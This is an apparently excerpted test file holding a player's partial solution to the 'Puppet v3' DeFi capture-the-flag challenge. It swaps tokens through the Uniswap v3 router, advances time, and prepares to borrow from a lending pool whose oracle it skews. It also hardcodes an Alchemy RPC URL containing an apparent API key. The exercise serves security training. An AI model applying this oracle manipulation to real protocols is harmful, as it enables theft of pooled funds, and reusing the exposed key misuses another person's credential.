...
describe('[Challenge] Puppet v3', function () {
    ...
    /** SET RPC URL HERE */
    const MAINNET_FORKING_URL = "https://eth-mainnet.alchemyapi.io/v2/NXP0eqdF8E8LYZT3T7psbDAfLpcB7TY4";
    ...
    before(async function () {
        ...
        const FEE = 3000; // 0.3%
        //console.log("aaaaaaaaaaaaaaaaa:",uniswapPositionManager.address);
    ...
    it('Execution', async function () {
       ...
       // const swap = await(await ethers.getContractFactory("swap",player)).deploy();
        //await token.connect(player).approve(swap.address,PLAYER_INITIAL_TOKEN_BALANCE);
        //await swap.connect(player).swapExactInputSingleHop(token.address,weth.address,3000,PLAYER_INITIAL_TOKEN_BALANCE);


        const router = await new ethers.Contract("0xE592427A0AEce92De3Edee1F18E0157C05861564", routerJson.abi, player);
        await token.connect(player).approve(router.address,PLAYER_INITIAL_TOKEN_BALANCE);
        //await token.connect(player).transfer(router.address,PLAYER_INITIAL_TOKEN_BALANCE);
        console.log(await token.balanceOf(router.address));
        ...
        console.log("wethbalance:",ethers.utils.formatEther(await weth.balanceOf(player.address)));
        //await weth.connect(player).withdraw(await weth.balanceOf(player.address));
        //console.log("ethbalance:",ethers.utils.formatEther(await ethers.provider.getBalance(player.address)));
        await time.increase(70); 
        console.log(ethers.utils.formatEther(await lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE)));
        await weth.connect(player).approve(lendingPool.address,100n * 10n ** 18n);
